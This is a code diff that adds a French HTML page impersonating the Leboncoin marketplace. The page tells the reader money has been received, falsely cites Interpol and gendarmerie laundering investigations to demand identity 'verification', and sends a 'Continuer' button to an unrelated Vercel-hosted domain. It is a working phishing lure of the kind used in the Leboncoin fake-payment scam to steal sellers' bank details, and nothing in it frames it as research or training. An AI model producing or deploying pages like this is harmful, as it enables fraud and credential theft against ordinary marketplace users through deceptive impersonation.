@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Point de contrôle</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" />
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            height: 100vh;
+            justify-content: flex-start;
+        }
+        header {
+            width: 100%;
+            padding: 20px 0;
+            display: flex;
+            justify-content: center;
+            background-color: #ffffff;
+            max-width: 360px;
+            box-sizing: border-box;
+        }
+        header img {
+            width: 110px;
+            height: auto;
+        }
+        main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            width: 100%;
+            max-width: 360px;
+            padding: 0 15px;
+            margin-top: 25px;
+            box-sizing: border-box;
+        }
+        h1 {
+            font-size: 22px;
+            margin: 0;
+            color: #333;
+        }
+        .validation-image {
+            width: 90px;
+            height: auto;
+            margin: 18px 0;
+        }
+        .message {
+            margin-top: 12px;
+            font-size: 15px;
+            color: #333;
+            line-height: 1.4;
+        }
+        .steps {
+            margin-top: 20px;
+            font-size: 15px;
+            color: #333;
+            width: 100%;
+            max-width: 320px;
+            text-align: left;
+        }
+        .steps h2 {
+            font-size: 18px;
+            margin-bottom: 12px;
+        }
+        .steps ul {
+            list-style-type: none;
+            padding-left: 0;
+            margin: 0;
+        }
+        .steps li {
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+        }
+        .steps li::before {
+            content: "→";
+            color: #ff6e14;
+            font-size: 20px;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        .coll {
+            margin-top: 25px;
+            width: 100%;
+            max-width: 320px;
+            display: flex;
+            justify-content: center;
+        }
+        .coll button {
+            width: 100%;
+            max-width: 250px;
+            height: 42px;
+            color: white;
+            background: #ff6e14;
+            border-radius: 20px;
+            border: none;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .coll button:hover {
+            background-color: #e05e00;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo Leboncoin" />
+</header>
+
+<main>
+    <h1>Vous avez reçu de l'argent !</h1>
+    <img src="https://zupimages.net/up/25/29/95d9.png" alt="Validation Image" class="validation-image" />
+    
+    <div class="message">
+        <p>
+            Ce Paiement Leboncoin a été déduit du compte de l'acheteur et a été "approuvé" par sa banque. Depuis ce lundi, le service Interpol et la gendarmerie ont suivi des traces de transferts frauduleux (blanchiment) via Leboncoin et certaines banques sont en partenariat. Cependant, une vérification est émise afin de confirmer que vous êtes bien le titulaire des informations enregistrées sur notre serveur.
+        </p>
+    </div>
+    
+    <div class="steps">
+        <h2>Voici les étapes à suivre :</h2>
+        <ul>
+            <li>Cliquez sur le bouton ci-dessous pour commencer.</li>
+            <li>Suivez les instructions à l'écran.</li>
+            <li>Si nécessaire, confirmez votre identité.</li>
+        </ul>
+    </div>
+
+    <div class="coll">
+        <button type="button" onclick="window.location.href='https://porte-monnaie-lbc-smoky.vercel.app/';">Continuer</button>
+    </div>
+</main>
+
+</body>
+</html>
